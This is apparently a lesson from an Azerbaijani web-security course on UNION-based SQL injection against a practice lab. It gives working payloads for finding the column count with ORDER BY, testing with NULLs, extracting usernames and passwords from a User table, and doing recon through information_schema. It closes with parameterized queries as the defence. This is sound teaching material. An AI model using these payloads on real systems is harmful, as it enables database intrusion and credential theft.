Dərs 22. UNION attack + bazanı tanımaq (SQLi pillələri 3-4)

bitdi

Məhsul siyahısına gizli User cədvəlini "yapışdırıb" parolları çıxarmaq, sonra bazanı tanımaq. Lab: /vuln/sqli.

🔧 UNION nədir

İki nəticəni bir-birinin altına yapışdırmaq (Excel cədvəllərini stəkləmək kimi). Şərt: hər iki tərəfdə eyni sayda sütun. Hücum: sayt bizə Product göstərir, biz oraya User-i yapışdırıb parolları "məhsul kimi" göstərdirik.

🧪 Pillə 3 — addım-addım

3a. Sütun sayını tap — ORDER BY (N-ci sütuna görə sırala):

?category=Gifts' ORDER BY 4--   → normal (4-cü sütun var)
?category=Gifts' ORDER BY 5--   → XƏTA (5-ci yoxdur)  ⇒ sorğu 4 sütun qaytarır

Vacib: "cədvəlin" yox, görünən sorğunun sütun sayını tapırıq (SELECT id, name, category, price = 4).

3b. UNION-u NULL-larla sına — NULL hər tipə uyğun gəlir, "düzgün qurulubmu?" yoxlaması:

?category=NoSuchCategory' UNION SELECT NULL,NULL,NULL,NULL--   → boş sətir gəldi ⇒ 4 düzdür

Səhv sayda NULL → xəta. Boş sətir → say düzgündür (ikinci təsdiq).

3c. Parolları sızdır — mətn sütunları 2-ci (name) və 3-cü (category) idi:

?category=NoSuchCategory' UNION SELECT id, username, password, 0 FROM "User"--

name sütununda istifadəçi adları, category sütununda parollar göründü. (0 = price ədəd sütunu üçün doldurma.)

🧪 Pillə 4 — bazanı tanımaq (real recon)

Real hücumda cədvəl/sütun adlarını bilmirsən — əvvəlcə kəşf edirsən.

Sütun adlarıcolumn_name ... FROM information_schema.columns WHERE table_name='User'(növbəti addım)

information_schema = bazanın öz-özü haqqında kataloqu. table_schema='public' sistem cədvəllərini gizlədir, yalnız bizimkiləri göstərir.

🛡️ Qorunma · qeydlər
  • Qayda (eynidir): parametrized query. Dəyər mətnə yapışdırılmasa, ' erkən bağlanmır, UNION əlavə oluna bilmir.
  • Giriş nöqtəsi: burada category URL-də idi, amma eyni injection POST body, cookie və ya header-də də ola bilər — Burp Repeater ilə oranı da dəyişmək olar (bax növbəti labların bəzisi POST olacaq).
  • Metod (əzbərlə): sütun sayı (ORDER BY) → NULL testi → mətn sütununu tap → məlumat çıxar → information_schema ilə recon.

Növbəti: sütun adları (information_schema.columns), sonra Blind SQLi (cavab görünmədən).
